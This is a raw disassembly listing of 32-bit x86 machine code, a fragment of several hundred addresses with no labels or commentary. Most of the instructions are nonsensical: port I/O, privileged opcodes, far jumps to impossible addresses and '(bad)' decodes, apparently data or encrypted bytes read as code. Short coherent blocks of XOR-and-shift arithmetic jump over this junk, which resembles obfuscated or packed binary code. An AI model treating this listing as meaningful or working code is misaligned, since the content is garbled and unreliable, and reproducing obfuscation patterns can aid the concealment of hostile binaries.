  41298a:	ss push edx
  41298c:	xchg   esi,eax
  41298d:	iret   
  41298e:	lods   eax,DWORD PTR ds:[esi]
  41298f:	mov    cl,0x3f
  412991:	sar    DWORD PTR [esi-0x20],cl
  412994:	enter  0x89dd,0xe8
  412998:	pop    edi
  412999:	fcomp  st(0)
  41299b:	add    bh,BYTE PTR [edi+edi*1]
  41299e:	and    al,0x95
  4129a0:	rcl    dh,0x19
  4129a3:	inc    eax
  4129a4:	or     al,0xc3
  4129a6:	add    ah,dl
  4129a8:	sbb    al,0xcc
  4129aa:	arpl   WORD PTR [edx],bp
  4129ac:	cli    
  4129ad:	push   edx
  4129ae:	data16 fdivp st(3),st
  4129b1:	pop    ebx
  4129b2:	push   0xa2c80622
  4129b7:	out    0xcb,al
  4129b9:	and    al,BYTE PTR [esi]
  4129bb:	adc    BYTE PTR [edi+0x74],0x34
  4129bf:	ror    BYTE PTR [ebx-0x71],0xbb
  4129c3:	into   
  4129c4:	das    
  4129c5:	pop    eax
  4129c6:	call   FWORD PTR [ebp+0x7f]
  4129c9:	in     eax,dx
  4129ca:	jne    0x4129f5
  4129cc:	adc    eax,0x25f50f52
  4129d2:	add    edi,DWORD PTR [ecx]
  4129d4:	call   0x8a2e:0xbef269cf
  4129db:	adc    DWORD PTR [edx+ecx*2+0x40],edi
  4129df:	test   eax,0x3daa7f79
  4129e4:	mov    dh,0x2e
  4129e6:	icebp  
  4129e7:	nop
  4129e8:	push   ebp
  4129e9:	and    esi,esp
  4129eb:	adc    DWORD PTR [ebp+edx*2+0x64],ecx
  4129ef:	sbb    BYTE PTR [ecx],0x7
  4129f2:	out    0x5b,eax
  4129f4:	jo     0x412981
  4129f6:	fst    st(0)
  4129f8:	sub    eax,0x1ce51fa2
  4129fd:	aas    
  4129fe:	adc    ebx,DWORD PTR [esi-0x213cc74]
  412a04:	stos   DWORD PTR es:[edi],eax
  412a05:	ins    BYTE PTR es:[edi],dx
  412a06:	arpl   di,bx
  412a08:	or     DWORD PTR [ebx+0x2e8efc86],eax
  412a0e:	jae    0x4129a6
  412a10:	jp     0x4129d6
  412a12:	xchg   ebp,eax
  412a13:	mov    cs,ebp
  412a15:	(bad)  [ecx-0x25]
  412a18:	mov    cl,0x3a
  412a1a:	enter  0x31fa,0xb5
  412a1e:	in     eax,dx
  412a1f:	test   eax,0x3dd01381
  412a24:	icebp  
  412a25:	or     DWORD PTR [esi],ebp
  412a27:	jge    0x4129cc
  412a29:	ret    
  412a2a:	ret    0xd114
  412a2d:	hlt    
  412a2e:	cwde   
  412a2f:	stos   DWORD PTR es:[edi],eax
  412a30:	out    0x66,eax
  412a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a33:	push   es
  412a34:	bound  ebx,QWORD PTR [ebp+0x35]
  412a37:	aaa    
  412a38:	mov    eax,ds:0x315009d3
  412a3d:	xor    esi,DWORD PTR ds:0x3c7d7f5
  412a43:	lods   eax,DWORD PTR ds:[esi]
  412a44:	push   edi
  412a45:	test   eax,0x2f4be781
  412a4a:	popa   
  412a4b:	ret    0x744d
  412a4e:	and    ebp,edi
  412a50:	test   BYTE PTR [esi+0x5b],bh
  412a53:	loope  0x412a71
  412a55:	xchg   esp,eax
  412a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a57:	and    eax,0xaed53ccf
  412a5c:	inc    ebp
  412a5d:	and    al,0x96
  412a5f:	in     al,dx
  412a60:	hlt    
  412a61:	pop    ecx
  412a62:	das    
  412a63:	pop    ds
  412a64:	(bad)  
  412a65:	scas   al,BYTE PTR es:[edi]
  412a66:	jne    0x412a4d
  412a68:	or     al,0xa4
  412a6a:	inc    ebp
  412a6b:	dec    esi
  412a6c:	fdivr  DWORD PTR [esi-0x38e8558b]
  412a72:	sti    
  412a73:	nop
  412a74:	inc    esp
  412a75:	or     eax,eax
  412a77:	xchg   ebp,eax
  412a78:	repz adc eax,0x90b20684
  412a7e:	inc    edx
  412a7f:	test   DWORD PTR [ebx-0x8],edi
  412a82:	lock push 0x59
  412a85:	pop    eax
  412a86:	sbb    ch,BYTE PTR [eax]
  412a88:	cmp    DWORD PTR [esi-0x5e731fc0],0x53
  412a8f:	and    cl,BYTE PTR [ecx+ebp*4]
  412a92:	adc    dl,ah
  412a94:	add    DWORD PTR [esi-0x7a],edi
  412a97:	jb     0x412a95
  412a99:	ins    DWORD PTR es:[edi],dx
  412a9a:	xchg   esp,eax
  412a9b:	add    dl,bh
  412a9d:	adc    al,0xe0
  412a9f:	mov    dh,0x15
  412aa1:	outs   dx,BYTE PTR ds:[esi]
  412aa2:	sbb    esp,DWORD PTR [edi-0x5b]
  412aa5:	loop   0x412ac3
  412aa7:	ja     0x412aec
  412aa9:	push   cx
  412aab:	out    dx,eax
  412aac:	lahf   
  412aad:	dec    ebx
  412aae:	inc    edi
  412aaf:	not    BYTE PTR es:[eax+0x7d]
  412ab3:	pop    edi
  412ab4:	popf   
  412ab5:	push   esp
  412ab6:	(bad)  
  412ab8:	mov    ecx,0x4f6160e8
  412abd:	(bad)
  412ac0:	mov    ch,0x92
  412ac2:	hlt    
  412ac3:	les    edx,FWORD PTR [ebx+0x75e825e2]
  412ac9:	ret    
  412aca:	mov    ah,0x4d
  412acc:	jmp    0x83b2:0xc310a312
  412ad3:	ins    DWORD PTR es:[edi],dx
  412ad4:	dec    edx
  412ad5:	(bad)  [eax+0x7015e999]
  412adb:	inc    ecx
  412adc:	out    0x6c,al
  412ade:	dec    esp
  412adf:	cmp    al,BYTE PTR [eax+eiz*4+0x56b7fb49]
  412ae6:	xchg   edx,eax
  412ae7:	push   esi
  412ae8:	std    
  412ae9:	retf   0xb4d8
  412aec:	adc    ah,ch
  412aee:	xchg   ecx,eax
  412aef:	das    
  412af0:	add    eax,0x898ef193
  412af5:	jns    0x412aa4
  412af7:	rcr    edi,1
  412af9:	and    ah,dh
  412afb:	aad    0x4c
  412afd:	inc    edx
  412afe:	sub    DWORD PTR [esi+0x26],ecx
  412b01:	in     al,dx
  412b02:	jne    0x412aee
  412b04:	xchg   edi,eax
  412b05:	jns    0x412b13
  412b07:	add    ecx,DWORD PTR [esi-0x48]
  412b0a:	xor    eax,0x1ac3f253
  412b0f:	mov    ah,0x54
  412b11:	push   esp
  412b12:	jle    0x412b2e
  412b14:	mov    WORD PTR [edi],?
  412b16:	inc    ecx
  412b17:	sub    al,0x1c
  412b19:	popa   
  412b1a:	xchg   edi,eax
  412b1b:	mov    dl,0x9c
  412b1d:	xchg   esp,eax
  412b1e:	test   BYTE PTR [eax+eiz*1+0x42],0x60
  412b23:	sbb    DWORD PTR [ebx],esi
  412b25:	adc    eax,0x3ca98e51
  412b2a:	(bad)  
  412b2b:	cdq    
  412b2c:	and    dh,BYTE PTR ds:0x31875925
  412b32:	mov    cs,WORD PTR [esi]
  412b34:	pop    ebp
  412b35:	sbb    ah,cl
  412b37:	sub    al,ah
  412b39:	dec    edi
  412b3a:	and    DWORD PTR [ebp-0x256cd87e],0x3
  412b41:	push   edi
  412b42:	pop    edi
  412b43:	jne    0x412b13
  412b45:	jmp    DWORD PTR [ebx]
  412b47:	addr16 jp 0x412b75
  412b4a:	mov    esp,0x787ed34c
  412b4f:	mov    al,0xe9
  412b51:	jns    0x412b8d
  412b53:	loop   0x412b34
  412b55:	retf   
  412b56:	dec    ebp
  412b57:	lea    edi,[ecx+0x72520899]
  412b5d:	in     eax,0x73
  412b5f:	pusha  
  412b60:	inc    esp
  412b61:	(bad)
  412b64:	or     cl,al
  412b66:	addr16 adc al,0x53
  412b69:	jl     0x412b1b
  412b6b:	jae    0x412b8e
  412b6d:	call   0xc2594dd9
  412b72:	and    ah,BYTE PTR [esi]
  412b74:	repz adc edx,esp
  412b77:	inc    edx
  412b78:	dec    esp
  412b79:	fdiv   QWORD PTR [ecx+0x1a666de0]
  412b7f:	jne    0x412bcd
  412b81:	push   0xd41bb3d8
  412b86:	std    
  412b87:	adc    eax,DWORD PTR [esi+0x15]
  412b8a:	inc    ebx
  412b8b:	fdiv   QWORD PTR [esp+eax*8-0x42]
  412b8f:	ret    0x46ed
  412b92:	xor    BYTE PTR ds:0xf16d7cee,ch
  412b98:	push   ecx
  412b99:	or     al,0x4
  412b9b:	xchg   BYTE PTR [edi+0x60],ah
  412b9e:	ss pop edx
  412ba0:	dec    ebp
  412ba1:	enter  0xfaae,0xb6
  412ba5:	xchg   edi,eax
  412ba6:	fiadd  DWORD PTR [edi]
  412ba8:	fs inc edx
  412baa:	int    0x45
  412bac:	sbb    esp,DWORD PTR [ebx+0x5896481d]
  412bb2:	or     al,0xcb
  412bb4:	inc    esi
  412bb5:	sub    BYTE PTR [eax+ebp*1],ah
  412bb8:	js     0x412b44
  412bba:	adc    DWORD PTR [eax+0x39a2d15d],ecx
  412bc0:	das    
  412bc1:	inc    eax
  412bc2:	imul   ebp,DWORD PTR [edx+0x63],0xffffffe3
  412bc6:	ffreep st(0)
  412bc8:	mov    ds:0x57e72f14,al
  412bcd:	add    dh,BYTE PTR [eax]
  412bcf:	lods   eax,DWORD PTR ds:[esi]
  412bd0:	adc    ebx,DWORD PTR [edx+0x27]
  412bd3:	fild   WORD PTR [edx+0x28]
  412bd6:	mov    edi,0x922a28e
  412bdb:	pop    ebp
  412bdc:	aaa    
  412bdd:	hlt    
  412bde:	cmp    dh,bl
  412be0:	popa   
  412be1:	adc    al,0xd3
  412be4:	retf   
  412be5:	cdq    
  412be6:	lods   eax,DWORD PTR ds:[esi]
  412be7:	inc    ebx
  412be8:	or     BYTE PTR [ecx+ebx*2],ah
  412beb:	ins    DWORD PTR es:[edi],dx
  412bec:	mov    ds:0xcd6ea4ce,al
  412bf1:	sub    bh,BYTE PTR [ebx]
  412bf3:	xchg   esi,eax
  412bf4:	cdq    
  412bf5:	lea    edi,[ebx+ebp*2]
  412bf8:	push   0xf3393965
  412bfd:	push   eax
  412bfe:	fmul   QWORD PTR [esp+esi*2]
  412c01:	loopne 0x412bc2
  412c03:	fwait
  412c04:	and    BYTE PTR ds:0x5c1e614d,ch
  412c0a:	aas    
  412c0b:	fimul  WORD PTR [edi-0x25]
  412c0e:	mov    eax,ds:0xfd3fb0b3
  412c13:	shl    BYTE PTR [ebp+0x30],1
  412c16:	mov    ds:0x47f714fa,eax
  412c1b:	fwait
  412c1c:	sub    DWORD PTR [ecx-0x24cb92f9],eax
  412c22:	jle    0x412c4a
  412c24:	enter  0xbff6,0xbe
  412c28:	ret    0x22a9
  412c2b:	mov    ebp,0x2174c722
  412c30:	mov    ch,BYTE PTR [esp+ecx*1-0x29]
  412c34:	sbb    DWORD PTR [ebx-0x3f],0x11799404
  412c3b:	push   ebx
  412c3c:	test   BYTE PTR [edi-0x26],al
  412c3f:	call   0xdd939b79
  412c44:	jecxz  0x412c64
  412c46:	and    BYTE PTR [esi-0x487b4786],bh
  412c4c:	xchg   edx,eax
  412c4d:	gs mov ch,0x3a
  412c50:	push   ss
  412c51:	pop    eax
  412c52:	or     al,0x3c
  412c54:	dec    eax
  412c55:	int    0xc0
  412c57:	lock loop 0x412c07
  412c5a:	pop    ecx
  412c5b:	jne    0x412c5c
  412c5d:	fsubr  DWORD PTR [ecx]
  412c5f:	(bad)  [edx+0x1b]
  412c62:	pushf  
  412c63:	sbb    eax,0xf9583d20
  412c68:	and    bh,BYTE PTR [esp+ebx*4+0x458be256]
  412c6f:	clc    
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0x6af64a76
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [esi+0x16],al
  412caf:	xchg   edi,eax
  412cb0:	sub    bl,bl
  412cb2:	mov    DWORD PTR [ebx+0x5bfd3df3],0xc3f37dc2
  412cbc:	xor    al,0x58
  412cbe:	mov    ebp,0xe94dfafa
  412cc3:	test   DWORD PTR [esp+eax*8],esi
  412cc6:	shr    dh,1
  412cc8:	mov    es,WORD PTR [edi+0x1e]
  412ccb:	fdiv   DWORD PTR ss:[eax]
  412cce:	and    bl,dh
  412cd0:	xchg   edi,eax
  412cd1:	xchg   DWORD PTR [edx-0x50],esp
  412cd4:	fwait
  412cd5:	jmp    DWORD PTR [eax]
  412cd7:	xchg   esp,eax
  412cd8:	adc    BYTE PTR [edi],ah
  412cda:	stc    
  412cdb:	sub    al,0xa
  412cdd:	pop    ebp
  412cde:	jmp    0x8ba04dbb
  412ce3:	or     bl,0xdb
  412ce6:	call   0x6ab3584b
  412ceb:	cli    
  412cec:	xchg   edx,eax
  412ced:	mov    DWORD PTR [ebx-0x2b],esp
  412cf0:	lock int 0xf4
  412cf3:	pop    edx
  412cf4:	scas   eax,DWORD PTR es:[edi]
  412cf5:	mov    dh,0x50
  412cf7:	int    0x59
  412cf9:	out    0x23,al
  412cfb:	not    DWORD PTR [edx+0x2b592880]
  412d01:	mov    eax,ds:0x58b4de65
  412d06:	data16 sbb BYTE PTR fs:[edi+0x5ca58bd7],dl
  412d0e:	ins    DWORD PTR es:[edi],dx
  412d0f:	mov    DWORD PTR [ebp-0x61],ebx
  412d12:	popf   
  412d13:	push   esp
  412d14:	ds mov al,0x8c
  412d17:	cmp    al,0x32
  412d19:	test   al,0x49
  412d1b:	jge    0x412d40
  412d1d:	pop    ebx
  412d1e:	jmp    0x7704cd05
  412d23:	gs out 0xd0,eax
  412d26:	sub    BYTE PTR [ecx],cl
  412d28:	ins    BYTE PTR es:[edi],dx
  412d29:	lea    esi,[ebx-0x1c6b9a86]
  412d2f:	mul    BYTE PTR [esi-0x59]
  412d32:	mov    bl,0x70
  412d34:	lock lea esi,[eax-0x1093f4b2]
  412d3b:	push   ebp
  412d3c:	dec    ebp
  412d3d:	jmp    0xc991:0x766a4932
  412d44:	in     al,0x5a
  412d46:	in     eax,0xf2
  412d48:	dec    ebx
  412d49:	lea    edx,[esi+0x3f]
  412d4c:	mov    esi,0x6159bf62
  412d51:	fcom   st(3)
  412d53:	mov    BYTE PTR [edx+0x4f4c3a4d],dh
  412d59:	dec    esi
  412d5a:	sbb    ebx,esi
  412d5c:	pop    es
  412d5d:	(bad)  
  412d5e:	mov    edi,DWORD PTR [edx]
  412d60:	(bad)  
  412d61:	pop    ecx
  412d62:	jecxz  0x412d4b
  412d64:	push   ss
  412d65:	repnz push ebp
  412d67:	jge    0x412d07
  412d69:	mov    ebx,0xbf1d4e92
  412d6e:	pop    ss
  412d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d70:	xor    eax,0x2157f413
  412d75:	dec    esp
  412d76:	addr16 sbb eax,0xe3afd107
  412d7c:	pop    ds
  412d7d:	ds ret 0x79ea
  412d81:	fwait
  412d82:	pcmpeqw mm0,QWORD PTR [esi-0x25]
  412d86:	bound  edx,QWORD PTR [edi-0x62]
  412d89:	pop    esp
  412d8a:	pushf  
  412d8b:	sbb    ah,bl
  412d8d:	mov    esi,0x667bd5a0
  412d92:	(bad)  
  412d93:	aad    0x2a
  412d95:	in     eax,0x85
  412d97:	cli    
  412d98:	and    DWORD PTR [ebx+0x549d47b7],esi
  412d9e:	rcl    ah,1
  412da0:	xchg   ebx,eax
  412da1:	push   ds
  412da2:	int    0x89
  412da4:	repz sti 
  412da6:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  412da8:	adc    DWORD PTR [edx],0x2cc827f9
  412dae:	jl     0x412dfe
  412db0:	jp     0x412dcd
  412db2:	mov    cl,0x27
  412db4:	jmp    0xa042:0xdca867d
  412dbb:	addr16 push ebx
  412dbd:	xchg   ebp,eax
  412dbe:	jecxz  0x412d83
  412dc0:	mov    edi,0x6fe5e2a9
  412dc5:	das    
  412dc6:	push   edx
  412dc7:	cmp    eax,0x5b45ed47
  412dcc:	sub    al,0x2
  412dce:	push   es
  412dcf:	pop    ecx
  412dd0:	retf   0x3b44
  412dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dd4:	xor    al,0x82
  412dd6:	shr    BYTE PTR [ebx],cl
  412dd8:	dec    ebx
  412dd9:	add    al,0x2a
  412ddb:	add    al,BYTE PTR [edi]
  412ddd:	cmp    al,0x28
  412ddf:	and    ebp,DWORD PTR [eax]
  412de1:	ds push 0x7c74b520
  412de7:	mov    edx,0x3ee0abaa
  412dec:	xor    eax,ebp
  412dee:	sbb    DWORD PTR [eax],0xffffff8a
  412df1:	cmp    al,0x24
  412df3:	popa   
  412df4:	cmp    edx,DWORD PTR [ebp+0x53]
  412df7:	mov    bh,0xd0
  412df9:	mov    dh,0xdf
  412dfb:	mov    ecx,DWORD PTR [edx]
  412dfd:	add    eax,0x3e22b8f6
  412e02:	fxch   st(6)
  412e04:	jmp    0xcc97:0x36bce703
  412e0b:	sti    
  412e0c:	push   ebp
  412e0d:	enter  0x5557,0x10
  412e11:	(bad)  
  412e12:	(bad)  [edi+0x45]
  412e15:	sahf   
  412e16:	mov    ecx,0x57dd4333
  412e1b:	neg    DWORD PTR [esi+0x3a]
  412e1e:	shl    BYTE PTR [eax+ebx*1],cl
  412e21:	mov    DWORD PTR [edx+0x721aae37],edi
  412e27:	sub    bl,cl
  412e29:	cmp    ch,bh
  412e2b:	sbb    edx,DWORD PTR [eax+0x373833a0]
  412e31:	data16 cmp al,0xc2
  412e34:	daa    
  412e35:	mov    ds:0xac62b623,eax
  412e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e3b:	dec    edx
  412e3c:	ja     0x412dce
  412e3e:	inc    edi
  412e3f:	loop   0x412e9c
  412e41:	and    cl,BYTE PTR [edi+0x36dd2ea7]
  412e47:	pop    eax
  412e48:	mov    bh,0xed
  412e4a:	rol    BYTE PTR [ebx],0x23
  412e4d:	or     eax,0xbdab23e2
  412e52:	sbb    eax,0x5a
  412e55:	mov    eax,DWORD PTR [ebp+0x61]
  412e58:	inc    edx
  412e59:	arpl   WORD PTR [esi],bx
  412e5b:	pop    esi
  412e5c:	cs lock stc 
  412e5f:	add    ebp,0xffffff83
  412e62:	fild   QWORD PTR [ebx]
  412e64:	loopne 0x412ee3
  412e66:	or     al,ch
  412e68:	push   0xffffff85
  412e6a:	pop    eax
  412e6b:	cmp    DWORD PTR [eax-0x7d9efe8d],eax
  412e71:	push   edi
  412e72:	fsub   DWORD PTR [eax]
  412e74:	jecxz  0x412eb4
  412e76:	sar    DWORD PTR [ebx+edx*4-0x37],1
  412e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e7b:	sti    
  412e7c:	out    dx,eax
  412e7d:	pushf  
  412e7e:	adc    ebp,esi
  412e80:	jp     0x412e69
  412e82:	and    al,0x24
  412e84:	stos   DWORD PTR es:[edi],eax
  412e85:	loope  0x412eb5
  412e87:	jbe    0x412e76
  412e89:	in     al,0x8c
  412e8b:	repz dec edi
  412e8d:	mov    ds:0xb00b24f3,eax
  412e92:	(bad)  
  412e93:	sti    
  412e94:	jmp    0x6fa7:0x7e2a9a47
  412e9b:	sub    al,0x87
  412e9d:	mov    cl,0xd7
  412e9f:	nop
  412ea0:	push   cs
  412ea1:	push   edi
  412ea2:	mov    esp,0x39e0ec38
  412ea7:	or     DWORD PTR [ebx+ecx*4+0x78],esp
  412eab:	or     al,BYTE PTR [ebx]
  412ead:	mov    bh,0x8b
  412eaf:	repnz bound edx,QWORD PTR [eax]
  412eb2:	lods   al,BYTE PTR ds:[esi]
  412eb3:	test   BYTE PTR [edx+0x264f020a],dh
  412eb9:	inc    edx
  412eba:	imul   edi,DWORD PTR [ecx+0x7c1f4d97],0x5
  412ec1:	out    0x5,eax
  412ec3:	sbb    eax,0x983c7a7a
  412ec8:	xchg   ebx,eax
  412ec9:	sub    eax,edi
  412ecb:	jae    0x412f39
  412ecd:	pushf  
  412ece:	pop    es
  412ecf:	push   0xffffffe3
  412ed1:	sbb    ah,bh
  412ed3:	add    eax,0x12ce0e5e
  412ed8:	lahf   
  412ed9:	nop
  412eda:	scas   al,BYTE PTR es:[edi]
  412edb:	mov    bl,cl
  412edd:	mov    bl,0xd9
  412edf:	outs   dx,DWORD PTR ds:[esi]
  412ee0:	jno    0x412eea
  412ee2:	add    dh,ah
  412ee4:	in     eax,0x3b
  412ee6:	and    eax,0xbd318f95
  412eeb:	int    0xb5
  412eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eee:	or     cl,cl
  412ef0:	pop    ds
  412ef1:	add    al,0x9b
  412ef3:	jmp    0x412e94
  412ef5:	aad    0xe6
  412ef7:	pop    esp
  412ef8:	sbb    al,bh
  412efa:	inc    esi
  412efb:	mov    BYTE PTR [edx-0x62209383],dh
  412f01:	out    0x82,eax
  412f03:	mov    ds:0xaba4bb35,al
  412f08:	cwde   
  412f09:	push   ebx
  412f0a:	cmp    edx,DWORD PTR [edi]
  412f0c:	sub    al,0xf5
  412f0e:	cmp    ebx,edx
  412f10:	xchg   ebx,eax
  412f11:	push   esp
  412f12:	lea    eax,[edi+0x13f941ce]
  412f18:	enter  0xf4e,0xc3
  412f1c:	pop    ebp
  412f1d:	add    dl,BYTE PTR [esi+0x256f4b83]
  412f23:	jb     0x412f54
  412f25:	(bad)  
  412f26:	sbb    eax,0x34230165
  412f2b:	dec    esp
  412f2c:	sub    al,0xc8
  412f2e:	pushf  
  412f2f:	jns    0x412f9a
  412f31:	out    0x3b,al
  412f33:	sbb    eax,0x5fb65158
  412f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f39:	data16 jp 0x412ed5
  412f3c:	clc    
  412f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f3e:	mov    eax,0x9896364b
  412f43:	ja     0x412f99
  412f45:	shl    BYTE PTR [ebp-0x59],1
  412f48:	cmp    BYTE PTR [ecx+0x6e6a4c32],al
  412f4e:	add    al,0xe9
  412f50:	dec    esp
  412f51:	add    eax,0x60c240ea
  412f56:	retf   0xfe7c
  412f59:	mov    dl,0xb8
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	mov    esi,0x7604c7f1
  412f61:	and    edx,DWORD PTR [esi]
  412f63:	es out 0x32,eax
  412f66:	outs   dx,BYTE PTR ds:[esi]
  412f67:	cmc    
  412f68:	jg     0x412fc3
  412f6a:	lods   al,BYTE PTR ds:[esi]
  412f6b:	jge    0x412fcf
  412f6d:	in     al,dx
  412f6e:	xchg   ecx,eax
  412f6f:	xchg   esi,eax
  412f70:	jno    0x412f7d
  412f72:	data16 test bh,ch
  412f75:	stc    
  412f76:	inc    ebx
  412f77:	cmp    DWORD PTR [ebx+0x49],eax
  412f7a:	arpl   WORD PTR [ebx],bp
  412f7c:	cdq    
  412f7d:	mov    edi,0xdfba361b
  412f82:	lahf   
  412f83:	mov    dl,0x53
  412f85:	aaa    
  412f86:	cmp    ah,BYTE PTR [ebx-0x72]
  412f89:	sti    
  412f8a:	dec    eax
  412f8b:	fcomip st,st(1)
  412f8d:	push   eax
  412f8e:	pop    edi
  412f8f:	lahf   
  412f90:	push   edx
  412f91:	jg     0x412f44
  412f93:	inc    edi
  412f94:	mov    edi,0x2961a0d8
  412f99:	call   0x874e1ca2
  412f9e:	add    eax,edx
  412fa0:	mov    esi,0xb552e49f
  412fa5:	loopne 0x412fd8
  412fa7:	adc    eax,0xe0f2664d
  412fac:	mov    ebp,ecx
  412fae:	sbb    eax,0x2a69d958
  412fb3:	push   esp
  412fb4:	and    dl,BYTE PTR [eax+0x76511140]
  412fba:	push   es
  412fbb:	mov    ebp,0xeb4fea0b
  412fc0:	xor    BYTE PTR [esi],bl
  412fc2:	xchg   ebx,eax
  412fc3:	retf   
  412fc4:	cmc    
  412fc5:	pop    ds
  412fc6:	out    0xa0,al
  412fc8:	and    BYTE PTR [ebx-0x76faf3a5],cl
  412fce:	sahf   
  412fcf:	imul   DWORD PTR [eax+eax*8-0x3b3df819]
  412fd6:	scas   al,BYTE PTR es:[edi]
  412fd7:	inc    edx
  412fd8:	mov    al,0x1b
  412fda:	xchg   ecx,eax
  412fdb:	or     bh,dl
  412fdd:	mov    ebx,0x340f2b14
  412fe2:	adc    bl,BYTE PTR [esi-0x53]
  412fe5:	lods   eax,DWORD PTR ds:[esi]
  412fe6:	xchg   esi,eax
  412fe7:	add    BYTE PTR [ebx+0x43],0x51
  412feb:	cld    
  412fec:	ror    BYTE PTR [edx],cl
  412fee:	pop    esi
  412fef:	in     al,0x8a
  412ff1:	jno    0x412f9c
  412ff3:	js     0x41305c
  412ff5:	retf   0x693b
  412ff8:	or     al,0xc7
  412ffa:	or     DWORD PTR [ecx+0x2f],ebx
  412ffd:	out    0x33,al
  412fff:	sbb    eax,0x6a6e4df2
  413004:	jae    0x412f99
  413006:	xor    eax,0x8f96615c
  41300b:	cld    
  41300c:	das    
  41300d:	inc    esp
  41300e:	mov    al,0x52
  413010:	ds sub bl,ch
  413013:	adc    ebp,DWORD PTR [ebx]
  413015:	mov    ebx,0x8fe3c56a
  41301a:	in     al,dx
  41301b:	adc    eax,0xc3acc5b5
  413020:	scas   al,BYTE PTR es:[edi]
  413021:	(bad)  
  413022:	leave  
  413023:	mov    bh,0x8b
  413025:	in     eax,0x67
  413027:	gs loope 0x413027
  41302a:	pushf  
  41302b:	or     eax,DWORD PTR [ebx+ebp*8+0x11]
  41302f:	pop    ecx
  413030:	pinsrw mm6,ebx,0xd7
  413034:	xchg   edx,eax
  413035:	aas    
  413036:	sub    al,dl
  413038:	test   eax,0x1919c67f
  41303d:	sub    al,0xce
  41303f:	sbb    eax,0x253c06d9
  413044:	pushf  
  413045:	xor    DWORD PTR [ebp-0x758a0e17],ecx
  41304b:	inc    edi
  41304c:	cmp    al,0x46
  41304e:	ror    BYTE PTR [esi+0x2e],cl
  413051:	(bad)  
  413052:	icebp  
  413053:	cmp    BYTE PTR [ebp-0x31403667],ah
  413059:	fwait
  41305a:	cmp    al,0x5b
  41305c:	xchg   DWORD PTR fs:[ebx],edi
  41305f:	popa   
  413060:	fist   DWORD PTR [esi+0x4a]
  413063:	or     dh,BYTE PTR [edi-0x76]
  413066:	(bad)  
  413067:	mov    ecx,0x42e85051
  41306c:	lock add BYTE PTR [eax],al
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [ebx+edi*1+0x7],edi
  4130e0:	inc    edi
  4130e1:	push   0xffffffd3
  4130e3:	dec    eax
  4130e4:	sbb    BYTE PTR [eax],bl
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    dh,dh
  4130eb:	mov    ds:0x1d0126d8,al
  4130f0:	xchg   ebp,eax
  4130f1:	pop    edi
  4130f2:	loopne 0x413143
  4130f4:	lahf   
  4130f5:	cmc    
  4130f6:	pusha  
  4130f7:	iret   
  4130f8:	and    eax,eax
  4130fa:	cwde   
  4130fb:	or     eax,0x2a66537
  413100:	mov    bh,0x19
  413102:	loop   0x4130e6
  413104:	in     al,0xca
  413106:	xchg   edx,eax
  413107:	imul   edi,esi,0x2d
  41310a:	sar    BYTE PTR [ebx+eax*4-0x43],0x4d
  41310f:	clc    
  413110:	std    
  413111:	xor    cl,BYTE PTR [ebx+0x6a4f16e3]
  413117:	ja     0x4130f3
  413119:	or     BYTE PTR [edx],bh
  41311b:	inc    edx
  41311c:	mov    ds:0xb2a7b94b,al
  413121:	mov    edx,0xe25b824a
  413126:	sub    eax,0x8ba80483
  41312b:	popf   
  41312c:	jle    0x41316f
  41312e:	mov    ecx,0x654b1b5f
  413133:	cmp    al,0xd9
  413135:	scas   al,BYTE PTR es:[edi]
  413136:	jbe    0x41318a
  413138:	cmp    DWORD PTR [edx],edi
